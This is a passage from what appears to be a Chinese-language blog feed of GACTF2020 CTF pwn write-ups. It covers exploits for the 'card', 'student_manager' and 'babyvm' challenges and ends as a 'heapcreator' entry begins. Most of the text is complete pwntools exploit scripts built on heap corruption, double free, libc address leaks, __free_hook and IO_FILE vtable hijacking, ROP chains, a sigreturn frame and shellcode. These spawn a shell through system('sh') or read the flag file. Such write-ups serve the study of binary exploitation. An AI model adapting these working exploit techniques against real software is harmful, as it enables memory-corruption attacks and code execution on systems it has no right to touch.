class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./card'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./card'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">"./card"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content,isEdit=True)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">if</span> isEdit:</span><br><span class="line">        p.recvuntil(<span class="string">"Message:"</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Backdoor</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Message:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x3e0</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x20</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">    Add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61\x05'</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'a'</span>,<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x4b0</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">        Backdoor(<span class="number">2</span>,<span class="string">'\xa0\x26'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Backdoor(<span class="number">2</span>,<span class="string">'\xa0\xa6'</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61\x05'</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'a'</span>,<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Add(<span class="number">0xa0</span>)<span class="comment">#1</span></span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\xa1\x00'</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#10</span></span><br><span class="line">    Backdoor(<span class="number">10</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvn(<span class="number">10</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>)) - (<span class="number">0x7ffff7fb9980</span><span class="number">-0x7ffff7dce000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">7</span>)</span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>*(<span class="number">7</span>-i))</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\xa1'</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#6</span></span><br><span class="line">    magic = libc_base + <span class="number">0x1547A0</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    loc_1547A0:</span></span><br><span class="line"><span class="string">        mov     rdx, [rdi+8]</span></span><br><span class="line"><span class="string">        mov     [rsp+0C8h+var_C8], rax</span></span><br><span class="line"><span class="string">        call    qword ptr [rdx+20h]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">7</span>,p64(libc.sym[<span class="string">'printf'</span>]))</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">6</span>,<span class="string">"%8$p"</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    stack_addr = int(p.recvuntil(<span class="string">"[+]"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">    log.success(<span class="string">"stack addr =&gt; "</span> + hex(stack_addr))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        Edit(<span class="number">7</span>,<span class="string">'a'</span>*(<span class="number">5</span>-i)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">8</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(stack_addr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>*(<span class="number">7</span>-i))</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\xa1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x98</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x0000555555554000+0x17bb'</span>)</span><br><span class="line">    Add(<span class="number">0x98</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    p_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">    p_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">    p_rax_rdx_r = libc_base + <span class="number">0x00000000001626d5</span></span><br><span class="line">    syscall = libc_base + <span class="number">0x0000000000066229</span></span><br><span class="line"></span><br><span class="line">    rops = flat([</span><br><span class="line">            p_rdi,stack_addr&amp;<span class="number">0xfffffffff000</span>,</span><br><span class="line">            p_rsi,<span class="number">0x1000</span>,</span><br><span class="line">            p_rax_rdx_r,<span class="number">10</span>,<span class="number">7</span>,<span class="number">0</span>,</span><br><span class="line">            syscall</span><br><span class="line">            ])</span><br><span class="line">    payload = rops + p64(len(rops)+stack_addr+<span class="number">0x8</span>)</span><br><span class="line">    sc = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov rdi,qword ptr &#123;0[0]&#125;</span></span><br><span class="line"><span class="string">            xor esi,esi</span></span><br><span class="line"><span class="string">            xor edx,edx</span></span><br><span class="line"><span class="string">            mov eax,2</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov edi,eax</span></span><br><span class="line"><span class="string">            mov rsi,qword ptr &#123;0[1]&#125;</span></span><br><span class="line"><span class="string">            mov edx,0x30</span></span><br><span class="line"><span class="string">            xor eax,eax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov edi,1</span></span><br><span class="line"><span class="string">            mov rsi,qword ptr &#123;0[1]&#125;</span></span><br><span class="line"><span class="string">            mov eax,1</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>.format([hex(stack_addr+<span class="number">0x90</span>),hex(stack_addr+<span class="number">0x200</span>)]))</span><br><span class="line">    payload += sc + <span class="string">'./flag'</span></span><br><span class="line">    <span class="keyword">print</span> hex(len(payload))</span><br><span class="line">    Backdoor(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="student-manager"><a href="#student-manager" class="headerlink" title="student_manager"></a>student_manager</h2><h3 id="程序逻辑-amp-amp-漏洞利用"><a href="#程序逻辑-amp-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>这是个cpp的程序，不过还是常规的菜单题，环境是18.04，有double free，hook会自动更新，因此用18.04的IO_FILE攻击。这里的数据结构有点难操作，只能写fd前四个字节，0x18处的8个字节以及0x20处的4个字节。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> node            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_10)</span><br><span class="line"><span class="number">00000000</span> score           dq ?</span><br><span class="line"><span class="number">00000008</span> field_8         dq ?</span><br><span class="line"><span class="number">00000010</span> field_10        dq ?</span><br><span class="line"><span class="number">00000018</span> name            dq ?</span><br><span class="line"><span class="number">00000020</span> id              dq ?</span><br><span class="line"><span class="number">00000028</span> node            ends</span><br></pre></td></tr></table></figure>
<p>先double free来leak处heap低四字节，劫持到tcache_perthread_struct的0x30处修改name上方的sz为0xb1，之前将count改为0xff，劫持到name这里释放从而leak出libc地址。</p>
<p>之后劫持tcache_bins[0x30]的值到_IO_2_1_stdout_的fp+0xe8，改为system，劫持fp+0xd8的vtable到_IO_str_jumps-0x28，最后add的时候使用一个shell注入语句触发system(“sh”)。之前的操作是把_IO_buf_end改成binsh的地址，这里直接在输入的时候触发调用，因为最后的fflush的参数就是输入缓冲区的地址。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./student_manager'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./student_manager'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id1,score=<span class="number">0x21</span>,name=<span class="string">"a"</span>)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"student's id:"</span>,str(id1))</span><br><span class="line">   p.sendlineafter(<span class="string">"student's name:"</span>,name)</span><br><span class="line">   p.sendlineafter(<span class="string">"student's score:"</span>,str(score))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id1)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"student's id:"</span>,str(id1))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id1)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"student's id:"</span>,str(id1))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    add(<span class="number">0x0</span>)</span><br><span class="line">    add(<span class="number">0x1</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">28</span>)</span><br><span class="line">    add(<span class="number">29</span>)</span><br><span class="line">    add(<span class="number">30</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"score:"</span>)</span><br><span class="line">    heap_base = int(p.recvline().strip(<span class="string">'\n'</span>)) - <span class="number">0x13290</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">8</span>,heap_base+<span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0xffff</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">11</span>,heap_base+<span class="number">0x13298</span>)</span><br><span class="line">    add(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xb1</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">14</span>,heap_base+<span class="number">0x132a0</span>)</span><br><span class="line">    add(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">16</span>)</span><br><span class="line">    delete(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0x61</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">96</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">17</span>,heap_base+<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">19</span>,<span class="number">0</span>,p64(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0xd0</span>)[:<span class="number">-1</span>])</span><br><span class="line">    add(<span class="number">20</span>,<span class="number">0</span>,p64(libc.sym[<span class="string">'system'</span>])[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#add(20,0,p64(libc.address+gadgets[0])[:-1])</span></span><br><span class="line">    <span class="comment">#print hex(libc_base+gadgets[0])</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">28</span>)</span><br><span class="line">    delete(<span class="number">28</span>)</span><br><span class="line">    delete(<span class="number">29</span>)</span><br><span class="line">    delete(<span class="number">29</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">21</span>,heap_base+<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line">    fake_vtable = libc_base + (<span class="number">0x7ffff7a43360</span><span class="number">-0x7ffff765b000</span>)</span><br><span class="line">    add(<span class="number">23</span>,<span class="number">0</span>,p64(libc_base+(<span class="number">0x7ffff7a47838</span><span class="number">-0x7ffff765b000</span>))[:<span class="number">-1</span>])</span><br><span class="line">    gdb.attach(p,<span class="string">'b free'</span>)</span><br><span class="line">    fake_vtable = (fake_vtable<span class="number">-0x28</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">print</span> hex(fake_vtable)</span><br><span class="line">    add(<span class="number">0</span>,(fake_vtable<span class="number">-0x100000000</span>),<span class="string">"';sh"</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><h3 id="程序逻辑-amp-漏洞分析"><a href="#程序逻辑-amp-漏洞分析" class="headerlink" title="程序逻辑 &amp; 漏洞分析"></a>程序逻辑 &amp; 漏洞分析</h3><p>题目模拟了一个vm，开了seccomp只能orw。有几个函数指针，分别是read/write/puts/free。和以往的题目不同，这里开始的code是作者指定的，如果输入的数据比较短就直接结束了。这里先fuzz一下，<code>1*0x200</code>打过去发现了错误，查看输入数据(尽量多往后看一点)，可以发现后面有个存储着code最后一次执行的地址，我们用第一次输出的机会leak出heap地址，改一下这个code地址，发现可以执行我们自己的代码，只有一次机会，这里先用0x90的指令把code地址改到堆上，然后就可以拿自定义指令做了。</p>
<p>先拿free把一个大堆块释放了，puts泄露出libc地址，通过修改<code>v34[1]</code>两次可以将free_hook改成setcontext+53，输入sigframe再调用free即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case 0x90:</span><br><span class="line">  v24 = (_QWORD *)v34[3];</span><br><span class="line">  v34[3] = v24 - 1;</span><br><span class="line">  v34[5] = *v24;                          // 这里</span><br><span class="line">  break;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./vmpwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./vmpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">"#tell me what is your name:"</span>)</span><br><span class="line">    payload = <span class="string">"1"</span>*<span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x50</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    p.recvuntil(<span class="string">"ok,what do you want to say:"</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x0000555555554000+0x15db'</span>)</span><br><span class="line">    code_addr = heap_base+<span class="number">0x2e80</span></span><br><span class="line">    payload = <span class="string">'\x8f'</span>*<span class="number">0x100</span>+p64(code_addr)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)+p64(heap_base+<span class="number">0x40</span>)</span><br><span class="line">    payload += chr(<span class="number">0x11</span>)+p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">    payload += chr(<span class="number">0x8f</span>)+chr(<span class="number">3</span>)</span><br><span class="line">    payload += chr(<span class="number">0x8f</span>)+chr(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#orw</span></span><br><span class="line">    <span class="comment">#target = heap_base+0x3068</span></span><br><span class="line">    target = heap_base+<span class="number">0x10</span></span><br><span class="line">    payload += chr(<span class="number">0x11</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload += chr(<span class="number">0x62</span>)+p64(<span class="number">-0x38</span>,sign=<span class="literal">True</span>)</span><br><span class="line">    payload += chr(<span class="number">0x63</span>)+p64(<span class="number">0x200</span>)</span><br><span class="line">    payload += chr(<span class="number">0x8f</span>)+chr(<span class="number">0x0</span>)</span><br><span class="line">    payload += chr(<span class="number">0x8f</span>)+chr(<span class="number">0</span>)</span><br><span class="line">    payload += chr(<span class="number">0x12</span>)+p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">    payload += chr(<span class="number">0x8f</span>)+chr(<span class="number">0</span>)</span><br><span class="line">    payload += chr(<span class="number">0x11</span>)+p64(heap_base+<span class="number">0x58</span>)</span><br><span class="line">    payload += chr(<span class="number">0x8f</span>)+chr(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.ljust(<span class="number">0x300</span>,<span class="string">'a'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"Now,I recevie your message,bye~\n"</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">88</span></span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#orw get flag</span></span><br><span class="line">    p_rdi = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">    p_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">    p_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">    p_rax = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">    syscall = libc_base + <span class="number">0x00000000000bc3f5</span></span><br><span class="line">    sigframe = SigreturnFrame()</span><br><span class="line">    sigframe.rdi = heap_base+<span class="number">0x50</span></span><br><span class="line">    sigframe.rsi = <span class="number">0</span></span><br><span class="line">    sigframe.rdx = <span class="number">0</span></span><br><span class="line">    sigframe.rax = <span class="number">2</span></span><br><span class="line">    sigframe.rsp = heap_base+<span class="number">0x50</span>+<span class="number">0x100</span></span><br><span class="line">    sigframe.rip = libc.sym[<span class="string">'open'</span>]</span><br><span class="line">    rop = flat([</span><br><span class="line">        p_rdi,<span class="number">3</span>,p_rsi,heap_base+<span class="number">0x500</span>,p_rdx,<span class="number">0x30</span>,p_rax,<span class="number">0</span>,syscall,</span><br><span class="line">        p_rdi,<span class="number">1</span>,p_rsi,heap_base+<span class="number">0x500</span>,p_rdx,<span class="number">0x30</span>,p_rax,<span class="number">1</span>,syscall,</span><br><span class="line">        ])</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">    payload = <span class="string">"./flag\x00\x00"</span></span><br><span class="line">    payload += str(sigframe)</span><br><span class="line">    payload += rop</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>GACTF2020</category>
      </categories>
      <tags>
        <tag>CTF writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>heapcreator</title>
    <url>/2020/09/03/heapcreator/</url>
    <content><![CDATA[<h1 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一道chunk extend的题，记录一下思路</p>
